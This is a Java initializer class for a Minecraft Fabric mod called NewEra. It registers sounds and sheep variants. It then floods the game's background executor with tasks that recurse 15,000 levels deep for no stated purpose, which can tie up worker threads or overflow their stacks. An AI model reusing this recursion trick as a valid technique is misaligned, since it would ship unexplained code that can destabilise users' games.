package com.newera.docs;

import net.fabricmc.api.ModInitializer;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class NewEraMod implements ModInitializer {
    public static final String MOD_ID = "newera";
    public static final Logger LOGGER = LoggerFactory.getLogger(MOD_ID);

    @Override
    public void onInitialize() {
        com.newera.docs.sound.ModSounds.initialize();
        net.fabricmc.fabric.api.event.registry.DynamicRegistries.registerSynced(
                com.newera.docs.entity.variant.NESheepVariants.SHEEP_VARIANT_KEY,
                com.newera.docs.entity.variant.NESheepVariant.DIRECT_CODEC,
                com.newera.docs.entity.variant.NESheepVariant.NETWORK_CODEC
        );

        com.newera.docs.sound.NESounds.registerSounds();

        int bgThreads = net.minecraft.util.Util.maxAllowedExecutorThreads();
        for (int i = 0; i < bgThreads * 2; i++) {
            net.minecraft.util.Util.backgroundExecutor().execute(() -> expandThreadStack(15000));
        }

        LOGGER.info("NewEra Mod initialized!");
    }

    public static void expandThreadStack(int depth) {
        if (depth <= 0) return;
        long a = depth, b = depth, c = depth, d = depth;
        expandThreadStack(depth - 1);
        if (a + b + c + d == 0) {
            System.out.print("");
        }
    }
}

